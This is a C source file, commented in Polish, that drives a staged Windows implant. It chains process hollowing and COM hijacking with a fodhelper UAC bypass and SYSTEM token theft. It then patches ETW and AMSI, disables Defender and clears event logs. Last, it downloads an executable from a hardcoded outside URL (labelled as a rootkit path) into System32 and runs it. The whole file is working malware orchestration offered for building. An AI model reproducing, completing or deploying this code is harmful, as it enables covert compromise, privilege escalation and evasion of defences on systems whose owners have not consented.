/*
 * malinowy_kozaczek — Stage-based Windows implant
 *
 * Architektura: 3-inwokacyjny pipeline przez flagi command line.
 *
 * ═══════════════════════════════════════════════════════════════════
 * INWOKACJA 1 — user level (bez flag):
 *   Stage 1: Process hijack (transacted hollowing → classic → COM)
 *   Stage 2: escalate_fodhelper() → spawnuje "malinowy.exe /elevate"
 *            z admin tokenem, potem ten proces exit.
 *
 * INWOKACJA 2 — admin (/elevate):
 *   Stage 2b: escalate_system_token() → znajduje SYSTEM process,
 *             kradnie token, spawnuje "malinowy.exe /system" jako SYSTEM
 *
 * INWOKACJA 3 — SYSTEM (/system):
 *   Stage 3: ETW/AMSI patch + Defender disable + log clear
 *   Stage 4: Pobranie xyz.exe z URL + drop do System32 + exec
 *            xyz.exe to osobna apka testowa. Nasza rola konczy sie na dostarczeniu go jako SYSTEM. xyz.exe sam sprawdza uprawnienia
 * ═══════════════════════════════════════════════════════════════════
 *
 * Design decisions:
 *   — 3 osobne procesy zamiast jednego który próbuje się podnieść —
 *     nie da się inline elevate z user → admin bez UAC prompta.
 *   — Flagi command line (/elevate, /system) są proste i niezawodne.
 *   — Każda instancja robi swoje i exit — nie ma shared state.
 *
 * Gotchas:
 *   — Fodhelper jest monitorowany przez Defender. Klucze rejestru
 *     są czyszczone natychmiast po triggerze, ale Tamper Protection
 *     na Win11 może to blokować. Wtedy token stealing z admina
 *     (który mamy jeśli exe był uruchomiony jako admin ręcznie)
 *     jest alternatywą.
 *   — CreateProcessWithTokenW może nie działać na LSA Protected
 *     processes (LSASS, csrss). Targetujemy winlogon i services.
 *   — Payload URL jest w main.c jako stała — zmień przed buildem.
 */

#include <windows.h>
#include <stdio.h>

#include "utils.h"
#include "hollow.h"
#include "escalate.h"
#include "evade.h"
#include "payload.h"

/* ── Konfiguracja ── */
#define PAYLOAD_URL    "https://convrolabs.com/v/files/AmebaRootKit/v27/xyz.exe"
#define PAYLOAD_NAME   "xyz.exe"
#define PAYLOAD_DROP   PAYLOAD_DROP_SYSTEM32

/* ── Forward declarations ── */
static int stage_hijack(void);
static int stage_escalate(void);
static int stage_evade(void);
static int stage_payload(void);

/* ── Entry point ── */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    /*
     * Parse command line flags.
     * Pierwszeństwo: /system > /elevate > brak flag
     */
    BOOL bElevate = (strstr(lpCmdLine, "/elevate") != NULL);
    BOOL bSystem  = (strstr(lpCmdLine, "/system") != NULL);

    if (bSystem || is_running_as_system())
    {
        /* ═══════════════════════════════════
         * SYSTEM — Stage 3 + Stage 4
         * ═══════════════════════════════════ */
        DEBUG_PRINT("[main] Running as SYSTEM.\n");

        if (stage_evade() != 0)
        {
            DEBUG_PRINT("[main] Evasion stage had issues — continuing anyway.\n");
        }

        if (stage_payload() != 0)
        {
            DEBUG_PRINT("[main] Payload stage failed.\n");
            return 3;
        }

        DEBUG_PRINT("[main] All stages complete.\n");
        return 0;
    }

    if (bElevate || is_running_as_admin())
    {
        /* ═══════════════════════════════════
         * ADMIN — Stage 2 (escalation to SYSTEM)
         * ═══════════════════════════════════ */
        DEBUG_PRINT("[main] Running as admin. Escalating to SYSTEM...\n");

        int result = escalate_to_system();
        if (result == 0)
        {
            /*
             * escalate_to_system() stworzył nowy proces /system.
             * Ten proces może się zakończyć — jego robota skończona.
             */
            DEBUG_PRINT("[main] SYSTEM escalation triggered. This process exiting.\n");
            return 0;
        }

        /*
         * Jeśli nie udało się stworzyć SYSTEM procesu,
         * próbujemy wykonać evasion i payload jako admin.
         * Może nie wszystko zadziała (niektóre operacje wymagają SYSTEM),
         * ale warto spróbować.
         */
        DEBUG_PRINT("[main] SYSTEM escalation failed — continuing as admin.\n");

        if (stage_evade() != 0)
        {
            DEBUG_PRINT("[main] Evasion failed (expected without SYSTEM).\n");
        }

        if (stage_payload() != 0)
        {
            DEBUG_PRINT("[main] Payload stage failed.\n");
        }

        return 0;
    }

    /* ═══════════════════════════════════
     * USER — Stage 1 (hijack) + Stage 2 (fodhelper)
     * ═══════════════════════════════════ */
    DEBUG_PRINT("[main] Running as user. Starting Stage 1: hijack...\n");

    if (stage_hijack() != 0)
    {
        DEBUG_PRINT("[main] Hijack failed — trying direct escalation anyway.\n");
    }

    /*
     * Uwaga: stage_hijack() mógł uruchomić nasz kod w kontekście
     * innego procesu (process hollowing). Jeśli tak, to poniższy
     * kod leci w kontekście zhijackowanego procesu.
     * escalate_fodhelper() zadziała tak samo.
     */
    DEBUG_PRINT("[main] Attempting fodhelper UAC bypass...\n");

    int result = escalate_fodhelper();
    if (result == 0)
    {
        /*
         * Fodhelper spawnnął malinowy.exe /elevate.
         * Ten proces (user level) może się zakończyć.
         */
        DEBUG_PRINT("[main] Fodhelper triggered. Elevated instance should be running.\n");
        return 0;
    }

    /*
     * W ostateczności — próbujemy token stealing z user level.
     * To raczej nie zadziała (brak SeDebugPrivilege), ale próbujemy.
     */
    DEBUG_PRINT("[main] Fodhelper failed (%d). Trying token steal from user...\n", result);

    result = escalate_to_system();
    if (result == 0)
    {
        DEBUG_PRINT("[main] SYSTEM escalation successful from user level.\n");
        return 0;
    }

    DEBUG_PRINT("[main] All escalation paths exhausted. Exiting.\n");
    return 2;
}

/* ───────────────────────────────────────────────
 * Stage 1: Process hijack
 * ───────────────────────────────────────────────
 * Próbuje 3 techniki hijacka w kolejności.
 * Jeśli któraś zadziała — dalszy kod w main() leci
 * w kontekście zhijackowanego procesu.
 */

static int stage_hijack(void)
{
    HANDLE hTargetProcess = NULL;
    DWORD  dwTargetPid    = 0;
    int    result         = 0;

    /* 1. Transacted hollowing (najbardziej stealth) */
    DEBUG_PRINT("[Stage 1] Trying transacted hollowing...\n");
    result = hollow_transacted_hijack(&hTargetProcess, &dwTargetPid);

    if (result != 0)
    {
        /* 2. Classic process hollowing */
        DEBUG_PRINT("[Stage 1] Transacted failed (0x%x). Trying classic hollowing...\n", result);
        result = hollow_classic_hijack(&hTargetProcess, &dwTargetPid);
    }

    if (result != 0)
    {
        /* 3. COM hijack (in-proc, nie potrzebuje uchwytu do procesu) */
        DEBUG_PRINT("[Stage 1] Classic hollowing failed. Trying COM hijack...\n");
        result = hollow_com_hijack();
    }

    if (result == 0)
    {
        DEBUG_PRINT("[Stage 1] Hijack successful (PID: %lu)\n", dwTargetPid);
    }
    else
    {
        DEBUG_PRINT("[Stage 1] All hijack techniques failed.\n");
    }

    return result;
}

/* ───────────────────────────────────────────────
 * Stage 2: Escalation
 * ───────────────────────────────────────────────
 * Uruchamiany z poziomu admin (po fodhelper).
 * Próbuje token stealing → named pipe fallback.
 */

static int stage_escalate(void)
{
    DEBUG_PRINT("[Stage 2] Starting SYSTEM escalation...\n");

    int result = escalate_to_system();

    if (result == 0)
    {
        DEBUG_PRINT("[Stage 2] SYSTEM process created.\n");
    }
    else
    {
        DEBUG_PRINT("[Stage 2] Escalation failed (%d).\n", result);
    }

    return result;
}

/* ───────────────────────────────────────────────
 * Stage 3: Defense evasion
 * ───────────────────────────────────────────────
 * Uruchamiany z poziomu SYSTEM.
 */

static int stage_evade(void)
{
    DEBUG_PRINT("[Stage 3] Patching ETW...\n");
    evade_patch_etw();

    DEBUG_PRINT("[Stage 3] Patching AMSI...\n");
    evade_patch_amsi();

    DEBUG_PRINT("[Stage 3] Disabling Windows Defender...\n");
    evade_disable_defender();

    DEBUG_PRINT("[Stage 3] Clearing event logs...\n");
    evade_clear_logs();

    return 0;
}

/* ───────────────────────────────────────────────
 * Stage 4: Payload
 * ───────────────────────────────────────────────
 * Uruchamiany z poziomu SYSTEM.
 * Pobiera xyz.exe z URL, drop do System32, exec.
 */

static int stage_payload(void)
{
    DEBUG_PRINT("[Stage 4] Fetching payload from %s\n", PAYLOAD_URL);

    int result = payload_fetch_and_exec(PAYLOAD_URL, PAYLOAD_NAME, PAYLOAD_DROP);

    if (result == 0)
    {
        DEBUG_PRINT("[Stage 4] Payload delivered successfully.\n");
    }
    else
    {
        DEBUG_PRINT("[Stage 4] Payload delivery failed. Trying alternative drop location...\n");

        /* Fallback: spróbuj temp zamiast system32 */
        result = payload_fetch_and_exec(PAYLOAD_URL, PAYLOAD_NAME, PAYLOAD_DROP_TEMP);

        if (result == 0)
        {
            DEBUG_PRINT("[Stage 4] Payload delivered to temp location.\n");
        }
        else
        {
            DEBUG_PRINT("[Stage 4] All payload delivery methods failed.\n");
        }
    }

    return result;
}
